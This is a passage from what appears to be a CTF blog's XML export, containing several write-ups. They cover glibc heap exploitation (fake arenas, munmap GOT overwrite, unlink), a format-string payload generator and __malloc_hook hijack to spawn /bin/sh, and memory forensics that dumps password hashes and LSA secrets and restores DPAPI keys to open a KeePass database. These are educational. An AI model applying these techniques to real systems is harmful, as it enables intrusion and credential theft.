accessible pointer for a fake _nl_global_locale. And think it as %r8, make sure that these will not cause a segmentation fault: mov 0x8(%r8), % rax mov 0x68(%r8), %r15 testb $0x20, 0x1 (%r15, %rax, 2) Here %rax usually range from ord(‘0’) to ord(‘9’) OK! Now just replace the pointer of the arena with an address which a fake arena structure is located at there. BUT! Due to ASLR, you may not know the exact address of your fake arena structure…… Actually there are two gaps and the location of the two gaps are easy to predicted. When I malloc() for hundreds of thousands of times, the process will try its best to bring out its virtual memory to satisfy my demand. And finally the chunk will be located between 0x10000 - 0x400000 and 0x401000 - 0x601010. AS you can see, I get two chunk, one is at 0x10000 and one is at 0x4010000. You can just put the fake arena and the fake _nl_global_locale in the 0x10000 chunk and then overwrite the pointer of the arena to 0x10010 (0x10000 + 0x10 is the beginning of the user data). FURTHERMORE The main_arena exploit on x86 is much more easier so I do not mention here. A writeup from 217 refers this: http://217.logdown.com/posts/241446-isg-2014-pepper View Heap as an Attacker – mmap() and munmap()OWN THE PAGE A trick Turn a r-- page into rw- page without calling mprotect() or even unmap .text page. Special thanks to jerry@217 for sharing this idea. As is mentioned before, if a chunk’s SIZE has 0x2 bit, it means this chunk is MMAPPED. And if we want to free a MMAPPED chunk, GLIBC will not call free() routine for normal heap chunk but munmap()! If you could overwrite the SIZE of a chunk, set its 0x2 bit and any large size you want, then free it! The memory of the size will be directly kicked out! Malloc()’d for thousands of times to push GLIBC to malloc a chunk at 0x300000 and 0x200000. Overflow the chunk at 0x200000 to make 0x300000’s SIZE to 0x200002. 0x400000 - 0x401000 is .text section of the process. It is really interesting right? Memory from 0x300000 to 0x500000 is munmap()’d by me. $rip is at 0x400b7f but it is an illegal address now! GOT is in the marked page. We could allocate a chunk in 0x401000-0x601000, overflow it and rewrite GOT. The sad thing is that if we want to overwrite GOT, we must cross 0x601000-0x602000, but however this page is non-writable! Use heaop heapoverflow to change the SIZE of chunk to 0x101002. Then free it! With no surprise, memory from 0x501000 to 0x602000 is kicked out. That means the non-writable page has already gone away. If we malloc(1052600), Non-writable page 0x601000-0x602000 will never be existed. Just overflow it to write GOT! It is a very interesting trick about mmap() and munmap() in GLIBC heap menagement. Keep in mind that the fake SIZE of the chunk you set must be times of a page size, due to ASSERT RESOURCESSTKOK https://github.com/hitcon2014ctf/ctf/raw/master/a679df07a8f3a8d590febad45336d031-stkof ORED https://github.com/lovelydream/CTF/blob/master/oreo_35f118d90a7790bbd1eb6d4549993ef0 PEPPER https://github.com/lovelydream/CTF/blob/master/pepper_e87791048cc540b725046a96d6724d8b REFERENCEhttp://conceptofproof.wordpress.com/2013/11/19/protostar-heap3-walkthrough/ http://acez.re/ https://rzhou.org/~ricky/hitcon2014/stkof/test.py https://www.blackhat.com/presentations/bh-usa-07/Ferguson/Whitepaper/bh-usa-07-ferguson-WP.pdf http://217.logdown.com/posts/241446-isg-2014-pepper http://googleprojectzero.blogspot.sg/2014/08/the-poisoned-nul-byte-2014-edition.html http://sebug.net/paper/phrack/66/p66_0x0A_Malloc_Des-Maleficarum.txt http://www.phrack.org/issues/57/8.html]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>HEAP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[karspersky-helpme]]></title>
    <url>%2F2017%2F10%2F19%2Fkarspersky-helpme%2F</url>
    <content type="text"><![CDATA[karspersky Helpme常规分析查看内存快照的属性123456789101112131415volatility -f ./memory.vmem imageinfoVolatility Foundation Volatility Framework 2.6INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86 AS Layer1 : IA32PagedMemoryPae (Kernel AS) AS Layer2 : FileAddressSpace (/home/flier/Desktop/karspersky/helpme/memory.vmem) PAE type : PAE DTB : 0x185000L KDBG : 0x82961be8L Number of Processors : 1 Image Type (Service Pack) : 0 KPCR for CPU 0 : 0x82962c00L KUSER_SHARED_DATA : 0xffdf0000L Image date and time : 2017-09-25 12:18:53 UTC+0000 Image local date and time : 2017-09-25 15:18:53 +0300 查看内存快照的进程12345678910111213141516171819202122232425262728293031323334353637383940volatility -f ./memory.vmem --profile=Win7SP0x86 pstreeVolatility Foundation Volatility Framework 2.6Name Pid PPid Thds Hnds Time-------------------------------------------------- ------ ------ ------ ------ ---- 0x86aa8328:wininit.exe 400 336 3 74 2017-09-25 12:08:15 UTC+0000. 0x86d28558:lsm.exe 516 400 9 141 2017-09-25 12:08:15 UTC+0000. 0x8cbc0030:services.exe 500 400 7 191 2017-09-25 12:08:15 UTC+0000.. 0x86f094f8:svchost.exe 768 500 20 452 2017-09-25 12:08:16 UTC+0000.. 0x870aa3b8:vmtoolsd.exe 1684 500 9 288 2017-09-25 12:08:18 UTC+0000... 0x85730030:cmd.exe 1956 1684 0 ------ 2017-09-25 12:18:53 UTC+0000.... 0x86185880:ipconfig.exe 3096 1956 0 ------ 2017-09-25 12:18:53 UTC+0000.. 0x86fbd500:spoolsv.exe 1304 500 13 324 2017-09-25 12:08:17 UTC+0000.. 0x86f42860:svchost.exe 924 500 35 910 2017-09-25 12:08:16 UTC+0000.. 0x86ee49d0:vmacthlp.exe 680 500 3 53 2017-09-25 12:08:16 UTC+0000.. 0x86da7a58:svchost.exe 884 500 19 430 2017-09-25 12:08:16 UTC+0000... 0x87036030:dwm.exe 1492 884 5 113 2017-09-25 12:08:17 UTC+0000.. 0x86fd9538:svchost.exe 1344 500 20 307 2017-09-25 12:08:17 UTC+0000.. 0x870ded40:msdtc.exe 2252 500 14 154 2017-09-25 12:08:29 UTC+0000.. 0x86c3a7b8:svchost.exe 716 500 8 251 2017-09-25 12:08:16 UTC+0000.. 0x86f81030:svchost.exe 1144 500 15 369 2017-09-25 12:08:16 UTC+0000.. 0x8722cd40:SearchIndexer. 2008 500 12 558 2017-09-25 12:08:26 UTC+0000.. 0x8709c6a8:VGAuthService. 1636 500 3 87 2017-09-25 12:08:18 UTC+0000.. 0x85085488:sppsvc.exe 3808 500 4 151 2017-09-25 12:10:21 UTC+0000.. 0x86dcb030:svchost.exe 620 500 11 350 2017-09-25 12:08:15 UTC+0000... 0x86313800:WmiPrvSE.exe 1732 620 10 199 2017-09-25 12:08:25 UTC+0000... 0x872a8848:WmiPrvSE.exe 2552 620 9 219 2017-09-25 12:08:45 UTC+0000.. 0x86f71b78:svchost.exe 1064 500 12 560 2017-09-25 12:08:16 UTC+0000.. 0x856aea58:svchost.exe 3844 500 12 350 2017-09-25 12:10:21 UTC+0000.. 0x870107a0:taskhost.exe 1400 500 7 150 2017-09-25 12:08:17 UTC+0000.. 0x871f1480:dllhost.exe 852 500 15 199 2017-09-25 12:08:25 UTC+0000. 0x86d2c188:lsass.exe 508 400 6 538 2017-09-25 12:08:15 UTC+0000 0x86b11d40:csrss.exe 348 336 8 415 2017-09-25 12:08:15 UTC+0000. 0x8504a7d8:conhost.exe 476 348 0 ------ 2017-09-25 12:18:53 UTC+0000 0x8703cc48:explorer.exe 1508 1476 24 763 2017-09-25 12:08:17 UTC+0000. 0x87100030:vmtoolsd.exe 1792 1508 7 198 2017-09-25 12:08:19 UTC+0000. 0x872a9458:KeePass.exe 2464 1508 7 304 2017-09-25 12:08:33 UTC+0000 0x84f4a8e8:System 4 0 87 397 2017-09-25 12:08:14 UTC+0000. 0x8c537930:smss.exe 264 4 2 29 2017-09-25 12:08:14 UTC+0000 0x86bb5d40:csrss.exe 408 392 10 192 2017-09-25 12:08:15 UTC+0000 0x86ca2920:winlogon.exe 456 392 3 117 2017-09-25 12:08:15 UTC+0000 dump 屏幕123456789101112volatility -f ./memory.vmem --profile=Win7SP0x86 screenshot -D ./dump_true Volatility Foundation Volatility Framework 2.6Wrote ./dump_true/session_0.msswindowstation.mssrestricteddesk.pngWrote ./dump_true/session_0.Service-0x0-3e4$.Default.pngWrote ./dump_true/session_0.Service-0x0-3e5$.Default.pngWrote ./dump_true/session_1.WinSta0.Default.pngWrote ./dump_true/session_1.WinSta0.Disconnect.pngWrote ./dump_true/session_1.WinSta0.Winlogon.pngWrote ./dump_true/session_0.Service-0x0-3e7$.Default.pngWrote ./dump_true/session_0.WinSta0.Default.pngWrote ./dump_true/session_0.WinSta0.Disconnect.pngWrote ./dump_true/session_0.WinSta0.Winlogon.png 发现这个地方有问题，是用的KeePass秘钥管理软件开启了一个叫FlagDatabase.kdbx的数据库 于是，扫描文件 123volatility -f ./memory.vmem --profile=Win7SP0x86 filescan | grep FlagDatabase.kdbx Volatility Foundation Volatility Framework 2.60x000000003daeb2c0 8 0 R--r-- \Device\HarddiskVolume1\Users\user\FlagDatabase.kdbx Dump 下来再说 123volatility -f ./memory.vmem --profile=Win7SP0x86 dumpfiles -Q 0x000000003daeb2c0 -D ./dump_true Volatility Foundation Volatility Framework 2.6DataSectionObject 0x3daeb2c0 None \Device\HarddiskVolume1\Users\user\FlagDatabase.kdbx volatility dump文件都是按照page的大小dump，要记得去除结尾的无用部分，这里就不一一赘述了 进一步分析查找KeePass配置文件12345678910111213141516volatility -f ./memory.vmem --profile=Win7SP0x86 filescan | grep KeePass Volatility Foundation Volatility Framework 2.60x000000003da006c0 8 0 R--r-- \Device\HarddiskVolume1\Users\user\AppData\Roaming\KeePass\KeePass.config.xml0x000000003da0e170 6 0 R--r-d \Device\HarddiskVolume1\Program Files\KeePass Password Safe 2\KeePassLibC32.dll0x000000003da27ae0 8 0 R--r-- \Device\HarddiskVolume1\Program Files\KeePass Password Safe 2\KeePass.config.xml0x000000003daa8e10 2 0 R--r-- \Device\HarddiskVolume1\Users\user\AppData\Roaming\KeePass\ProtectedUserKey.bin0x000000003dce1850 6 0 R--r-d \Device\HarddiskVolume1\Program Files\KeePass Password Safe 2\unins000.exe0x000000003dd01568 8 0 R--r-d \Device\HarddiskVolume1\Program Files\KeePass Password Safe 2\KeePass.exe.config0x000000003dd01b78 8 0 R--r-d \Device\HarddiskVolume1\Program Files\KeePass Password Safe 2\KeePass.exe0x000000003dd14a00 7 0 R--r-d \Device\HarddiskVolume1\Program Files\KeePass Password Safe 2\KeePass.exe0x000000003ddb55f8 1 1 R--rw- \Device\HarddiskVolume1\Program Files\KeePass Password Safe 20x000000003ddb8bc8 5 0 R--r-d \Device\HarddiskVolume1\Windows\assembly\NativeImages_v2.0.50727_32\KeePass\61401321a8fb44541efab9aa5fb7fb69\KeePass.ni.exe0x000000003e9f8468 8 0 R--r-d \Device\HarddiskVolume1\Program Files\KeePass Password Safe 2\KeePass.XmlSerializers.dll0x000000003e9f8678 4 1 R--r-d \Device\HarddiskVolume1\Program Files\KeePass Password Safe 2\KeePass.XmlSerializers.dll0x000000003ef96eb8 8 0 R--rw- \Device\HarddiskVolume1\Users\user\Desktop\KeePass 2.lnk0x000000003ff6deb8 8 0 R--rw- \Device\HarddiskVolume1\Users\user\Desktop\KeePass 2.lnk Dump \Device\HarddiskVolume1\Users\user\AppData\Roaming\KeePass\KeePass.config.xml123volatility -f ./memory.vmem --profile=Win7SP0x86 dumpfiles -Q 0x000000003da006c0 -D ./dump_trueVolatility Foundation Volatility Framework 2.6DataSectionObject 0x3da006c0 None \Device\HarddiskVolume1\Users\user\AppData\Roaming\KeePass\KeePass.config.xml 分析配置文件1234567891011121314151617131 &lt;/PasswordGenerator&gt;132 &lt;Defaults&gt;133 &lt;OptionsTabIndex&gt;0&lt;/OptionsTabIndex&gt;134 &lt;SearchParameters&gt;135 &lt;ComparisonMode&gt;InvariantCultureIgnoreCase&lt;/ComparisonMode&gt;136 &lt;/SearchParameters&gt;137 &lt;KeySources&gt;138 &lt;Association&gt;139 &lt;DatabasePath&gt;..\..\Users\user\FlagDatabase.kdbx&lt;/DatabasePath&gt;140 &lt;UserAccount&gt;true&lt;/UserAccount&gt;141 &lt;/Association&gt;142 &lt;/KeySources&gt;143 &lt;/Defaults&gt;144 &lt;Integration&gt;145 &lt;HotKeyGlobalAutoType&gt;393281&lt;/HotKeyGlobalAutoType&gt;146 &lt;HotKeySelectedAutoType&gt;0&lt;/HotKeySelectedAutoType&gt;147 &lt;HotKeyShowWindow&gt;393291&lt;/HotKeyShowWindow&gt; 这里的UserAccount置位true，表明使用了windows 用户的 master key 进行加密 由于没有其他的加密选项，所以就是只用了windows的账户验证这一种加密 奔向答案参考 http://www.harmj0y.net/blog/redteaming/a-case-study-in-attacking-keepass/ 要恢复一个操作系统上用KeePass的windows账户验证加密的数据库，我们需要以下条件： %APPDATA%\Microsoft\Protect\目录下的所有文件 Preferred master key file with a GUID naming (Windows账户主密钥文件) KeePass加密使用的软件主密钥 ProtectedUserKey.bin Windows账户的信息 UserDomain 密码 SID UserName xxxx.kdbx 加密后的秘钥数据库 目前，我们缺少的就是: %APPDATA%\Microsoft\Protect\目录下的所有文件 KeePass加密使用的软件主密钥 Windows账户的信息 搞SID目录下的文件10x000000003daa8d58 2 0 R--r-- \Device\HarddiskVolume1\Users\user\AppData\Roaming\Microsoft\Protect\S-1-5-21-196189514-4237867838-3788442389-1000\Preferred 123volatility -f ./memory.vmem --profile=Win7SP0x86 dumpfiles -Q 0x000000003daa8d58 -D ./dump_trueVolatility Foundation Volatility Framework 2.6DataSectionObject 0x3daa8d58 None \Device\HarddiskVolume1\Users\user\AppData\Roaming\Microsoft\Protect\S-1-5-21-196189514-4237867838-3788442389-1000\Preferred 这里有个坑点，就是 \Device\HarddiskVolume1\Users\user\AppData\Roaming\Microsoft\Protect\S-1-5-21-196189514-4237867838-3788442389-1000\7315eeac-ce04-46ff-87ac-4fc9cf1d41d3 windows主密钥文件搞不下来 无奈之下，只好通过主密钥文件的特征进行搜索 搞ProtectedUserKey.bin123volatility -f ./memory.vmem --profile=Win7SP0x86 dumpfiles -Q 0x000000003daa8e10 -D ./dump_trueVolatility Foundation Volatility Framework 2.6DataSectionObject 0x3daa8e10 None \Device\HarddiskVolume1\Users\user\AppData\Roaming\KeePass\ProtectedUserKey.bin 搞用户信息尝试hashdump，发现密码太长，搞不定12345volatility -f ./memory.vmem --profile=Win7SP0x86 hashdumpVolatility Foundation Volatility Framework 2.6Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::user:1000:aad3b435b51404eeaad3b435b51404ee:8943ccc24f82983c8b791b7f648679c0::: 尝试rekall mimikatz，搞定1rekall -f memory.vmem mimikatz lsadump 也可以123456789101112131415volatility -f ./memory.vmem --profile=Win7SP0x86 lsadump Volatility Foundation Volatility Framework 2.6DefaultPassword0x00000000 4e 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 N...............0x00000010 79 00 6f 00 75 00 5f 00 6e 00 65 00 65 00 64 00 y.o.u._.n.e.e.d.0x00000020 5f 00 61 00 6e 00 6f 00 74 00 68 00 65 00 72 00 _.a.n.o.t.h.e.r.0x00000030 5f 00 6b 00 65 00 79 00 5f 00 74 00 6f 00 5f 00 _.k.e.y._.t.o._.0x00000040 70 00 61 00 73 00 73 00 5f 00 74 00 68 00 69 00 p.a.s.s._.t.h.i.0x00000050 73 00 5f 00 6c 00 65 00 76 00 65 00 6c 00 00 00 s._.l.e.v.e.l...DPAPI_SYSTEM0x00000000 2c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ,...............0x00000010 01 00 00 00 b8 5c 72 98 16 2b f1 72 c9 84 2c 68 .....\r..+.r..,h0x00000020 f3 07 bb 2b e6 ce 6a 4b 73 f1 ec fa a6 51 61 7d ...+..jKs....Qa&#125;0x00000030 4a 82 97 61 db 55 d2 34 e8 df 7f b8 00 00 00 00 J..a.U.4........ 密码是 yo_need_another_key_to_pass_this_level，真tmd长 搞账户信息1234567891011121508 explorer.exe 0x002ebf88 PUBLIC C:\Users\Public 1508 explorer.exe 0x002ebf88 SESSIONNAME Console 1508 explorer.exe 0x002ebf88 SystemDrive C: 1508 explorer.exe 0x002ebf88 SystemRoot C:\Windows 1508 explorer.exe 0x002ebf88 TEMP C:\Users\user\AppData\Local\Temp 1508 explorer.exe 0x002ebf88 TMP C:\Users\user\AppData\Local\Temp 1508 explorer.exe 0x002ebf88 USERDOMAIN WIN-GFCKT3R8MQ2 1508 explorer.exe 0x002ebf88 USERNAME user 1508 explorer.exe 0x002ebf88 USERPROFILE C:\Users\user 1508 explorer.exe 0x002ebf88 windir C:\Windows 1636 VGAuthService. 0x003207f0 ALLUSERSPROFILE C:\ProgramData 1636 VGAuthService. 0x003207f0 APPDATA C:\Windows\system32\config\systemprofile\AppD 恢复KeePass加密数据1Restore-UserDPAPI -Path C:\Users\W\Desktop\S-1-5-21-196189514-4237867838-3788442389-1000 -UserName user -UserDomain WIN-GFCKT3R8MQ2 -ProtectedUserKey C:\Users\W\Desktop\ProtectedUserKey.bin Restore-UserDPAPI脚本如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108function Restore-UserDPAPI &#123;&lt;# .SYNOPSIS Restores a user account's DPAPI master key on a new system. Author: @harmj0y License: BSD 3-Clause Required Dependencies: None Optional Dependencies: None .DESCRIPTION This function will take a backup of a user's DPAPI master key folder (C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Protect\&lt;SID&gt;\), copies the folder to %APPDATA%\Microsoft\Protect\ for the current user on a new machine, sets several DPAPI MigratedUsers registry keys necessary, and invokes dpapimig.exe to kick off "Protected Content Migration". If the password for the user account associated with the master key differs from the current user's, the "Protected Content Migration" GUI will prompt for the old user password. There is more information on this process from KeePass at https://sourceforge.net/p/keepass/wiki/Recover%20Windows%20User%20Account%20Credentials/ .PARAMETER Path The C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Protect\&lt;SID&gt;\ folder to restore, must be in S-1-... SID format. .PARAMETER UserName The username linked to the folder to restore. .PARAMETER UserDomain The domain (or local machine) linked to the UserName/folder. .PARAMETER ProtectedUserKey The path to an optional ProtectedUserKey.bin KeePass DPAPI blob. .EXAMPLE PS C:\Temp&gt; Restore-UserDPAPI -Path C:\Temp\S-1-5-21-456218688-4216621462-1491369290-1210\ -UserName testuser -UserDomain testlab.local Restores the DPAPI master key for the testlab.local\testuser (SID=S-1-5-21-456218688-4216621462-1491369290-1210) from the C:\Temp\S-1-5-21-456218688-4216621462-1491369290-1210\ backup folder. .EXAMPLE PS C:\Temp&gt; Restore-UserDPAPI -Path C:\Temp\S-1-5-21-456218688-4216621462-1491369290-1210\ -UserName testuser -UserDomain testlab.local -ProtectedUserKey ProtectedUserKey.bin Restores the DPAPI master key for the testlab.local\testuser (SID=S-1-5-21-456218688-4216621462-1491369290-1210) from the C:\Temp\S-1-5-21-456218688-4216621462-1491369290-1210\ backup folder, and copies the KeePass-specific ProtectedUserKey.bin DPAPI blob into the proper location. .LINK https://sourceforge.net/p/keepass/wiki/Recover%20Windows%20User%20Account%20Credentials/#&gt; [CmdletBinding()] Param( [Parameter(Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)] [ValidateScript(&#123; Test-Path -Path $_ &#125;)] [String] $Path, [Parameter(Mandatory=$True)] [ValidateNotNullOrEmpty()] [String] $UserName, [Parameter(Mandatory=$True)] [ValidateNotNullOrEmpty()] [String] $UserDomain, [ValidatePattern('.*ProtectedUserKey\.bin')] [ValidateScript(&#123; Test-Path -Path $_ &#125;)] [Alias('KeePassBlob')] [String] $ProtectedUserKey ) $UserFolder = Get-Item $Path $SID = $UserFolder.Name if($SID -notmatch '^S-1-.*') &#123; throw "User folder must be in 'S-1-...' SID format!" &#125; Write-Host "`n[*] Copying $($UserFolder.FullName) DPAPI folder to $ENV:APPDATA\Microsoft\Protect\" Copy-Item -Path $UserFolder -Destination $ENV:APPDATA\Microsoft\Protect\ -Recurse -Force Write-Host "`n[*] Creating DPAPI MigratedUsers registry keys" $Null = New-Item -Path "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\DPAPI\MigratedUsers\$SID\UserDomain" -Force $Null = New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\DPAPI\MigratedUsers\$SID\UserDomain" -Name $UserDomain -Force $Null = New-Item -Path "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\DPAPI\MigratedUsers\$SID\UserName" -Force $Null = New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\DPAPI\MigratedUsers\$SID\UserName" -Name $UserName -Force Write-Host "`n[*] Calling dpapimig.exe... (this may take just a bit)`n" Start-Process $ENV:WINDIR\System32\dpapimig.exe -NoNewWindow -Wait if($PSBoundParameters['ProtectedUserKey']) &#123; $ProtectedUserKeyFile = Get-Item $ProtectedUserKey Write-Host "[*] Copying $($ProtectedUserKeyFile.FullName) to $ENV:APPDATA\KeePass\`n" if (-not (Test-Path -Path $ENV:APPDATA\KeePass\)) &#123; $Null = New-Item $ENV:APPDATA\KeePass\ -Type Directory &#125; Copy-Item -Path $ProtectedUserKeyFile -Destination $ENV:APPDATA\KeePass\ -Force &#125;&#125; 会要求输入需要恢复的用户的密码，输入即可you_need_another_key_to_pass_this_level 打开KeePass，选择使用windows账户进行验证]]></content>
      <categories>
        <category>MISC</category>
      </categories>
      <tags>
        <tag>MISC</tag>
        <tag>forensic</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[fmt_str write func]]></title>
    <url>%2F2017%2F10%2F16%2Ffmt-str-write-func%2F</url>
    <content type="text"><![CDATA[12345678910111213141516171819202122def format(writes, idx, address_string): printed = len(address_string) payload = "" for where, what in sorted(writes.items(),key = lambda tmp:tmp[1]): print where, what to_add = (what - printed) &amp;0xffff if to_add &gt; 0: if to_add &lt; 8: payload += (what-printed) * 'a' else: payload += '%0' + str(to_add) + 'x' payload += '%' + str(where + idx) + '$hn' printed += to_add return address_string + payloadwrites = &#123;&#125;writes[0] = (0x12345678 &gt;&gt; 16) &amp; 0xffffwrites[1] = 0x12345678 &amp; 0xffffwrites[2] = (0x12abcdef &gt;&gt; 16) &amp; 0xffffwrites[3] = 0x12abcdef &amp; 0xffffaddr_string = '\x12\x34\x56\x78' + '\x12\x34\x56\x78' + '\x12\x34\x56\x78' + '\x12\x34\x56\x78'print format(writes, 0, addr_string)]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>FORMAT STRING</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[format string overwrite __malloc_hook]]></title>
    <url>%2F2017%2F10%2F16%2Fformat-string-overwrite-malloc-hook%2F</url>
    <content type="text"><![CDATA[format string &amp; reload &amp; __malloc_hookWhen we can use format string to write our data to any address, this elf file is marked as reload. So we can’t easily write our data to got table to control the ip. We can still control the ip by writing data to the address of __malloc_hook in glibc. Does printf function call malloc? When we use printf and the format string cantains ‘%WIDTHs’ and the WIDTH is over 32 bytes, printf will call malloc to allocate more memory for itself. How to use printf‘s calling malloc? When we know the base address of glibc, we can write our data to libc. When we overwrite __malloc_hook in glibc, we can control the flow of malloc function. We can use format string to write “/bin/sh” on the address in r/w segment write the address of system in glibc on the address of __malloc_hook use ‘%WIDTHs’ (WIDTH is the address of ‘/bin/sh’ minus 32) to call malloc while __malloc_hook is the address of system.Due to that the first parameter of malloc is the size we need and the first parameter of system is the address of the cmd we call system(cmd), we successfully execute the cmd like ‘/bin/sh’.]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>FORMAT STRING</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[unlink]]></title>
    <url>%2F2017%2F10%2F16%2Funlink%2F</url>
    <content type="text"><![CDATA[HEAP UNLINK ATTACKWHAT IS UNLINK12345678910111213141516171819202122232425262728#define unlink(P, BK, FD) &#123; FD = P-&gt;fd; BK = P-&gt;bk; if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) malloc_printerr (check_action, "corrupted double-linked list", P); else &#123; FD-&gt;bk = BK; BK-&gt;fd = FD; if (!in_smallbin_range (P-&gt;size) &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123; assert (P-&gt;fd_nextsize-&gt;bk_nextsize == P); assert (P-&gt;bk_nextsize-&gt;fd_nextsize == P); if (FD-&gt;fd_nextsize == NULL) &#123; if (P-&gt;fd_nextsize == P) FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD; else &#123; FD-&gt;fd_nextsize = P-&gt;fd_nextsize; FD-&gt;bk_nextsize = P-&gt;bk_nextsize; P-&gt;fd_nextsize-&gt;bk_nextsize = FD; P-&gt;bk_nextsize-&gt;fd_nextsize = FD; &#125; &#125; else &#123; P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize; P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize; &#125; &#125; &#125;&#125; WHEN UNLINK SHOULD BE CALLED(1) pass the CHECK of UNLINK FD->bk == P &amp;&amp; BK->fd == P (2) prev/after chunk is marked as free()’dWhen GLIBC free a chunk, it will going to see whether the chunk before/after is free. If it is, then the chunk before/after will be unlink()’d off its double-linked list and these two chunks merge into one chunk. HOW TO BYPASS CHECK (1) got a address of the PTR to the address of &amp;LABEL(fake chunk) ( &amp;chunk header + word_size * 2 )PTR(the ptr to the fake chunk LABEL) Before Overflow PREV_SIZE(get prev LABEL here) SIZE(lowest bit PREV_USE) the user data(malloc return) user data …… …… PREV_SIZE(get prev LABEL here) SIZE(lowest bit PREV_USE) After Overflow(along with with fake chunk make) PREV_SIZE(get prev LABEL here) SIZE(lowest bit PREV_USE) PREV_SIZE (faked) SIZE (faked) FD(faked)(malloc_return - word_size * 3) BK(faked)(malloc_return - word_size * 2) …… …… PREV_SIZE (&amp;LABEL_FREEING - &amp;LABEL_fake) SIZE(lowest bit set to 0) So, we get the PTR to the LABEL of the fake chunk by using the malloc return of previous chunk . (2) write heap to make a fake LABELPREV_SIZE: Any ValueSIZE: Any ValueFD: the address of PTR(mentioned above) - word_size * 3 (we need FD-&gt;bk)BK: the address of PTR(mentioned above) - word_size * 2 (we need BK-&gt;fd) (3) overwrite the chunk FREEING &amp;LABEL(FREEING chunk) - PREV_SIZE(FREEING chunk) == &amp;LABEL(fake chunk) So, PREV_SIZE(FREEING chunk) should be the value of &amp;LABEL(FREEING chunk) minus &amp;LABEL(fake chunk) The lowest bit of SIZE(FREEING chunk) which marking whether the PREV_chunk been used as 0 WHAT HAPPENED WHEN BAD UNLINK DONE The FD->bk (PTR - word_size * 3 + word_size * 3) is set as BK, which is PTR - word_size * 2 The BK->fd (PTR - word_size * 2 + word_size * 2 is set as FD, which is PTR - word_size * 3 So the ptr list has been destroyed, but the mem between ptrs has been free()’d. Next time we call malloc, we will get the mem and can write it easily;]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>HEAP</tag>
      </tags>
  </entry>
</search>
